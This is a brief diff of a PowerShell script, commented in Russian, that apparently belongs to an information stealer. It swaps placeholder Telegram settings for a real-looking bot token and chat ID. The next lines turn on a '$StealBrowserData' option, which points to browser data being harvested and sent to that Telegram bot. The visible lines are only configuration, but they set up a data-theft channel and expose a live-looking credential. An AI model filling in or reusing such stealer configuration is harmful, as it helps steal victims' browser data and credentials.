@@ -12,8 +12,8 @@
 # -------------------------------------------------------------------------------------------------
 
 # --- Конфигурация Telegram ---
-$TelegramToken = "<ВАШ_ТОКЕН>"
-$ChatID = "<ВАШ_CHAT_ID>"
+$TelegramToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
+$ChatID = "1266539824"
 
 # --- Настройки сбора данных ---
 $StealBrowserData      = $true
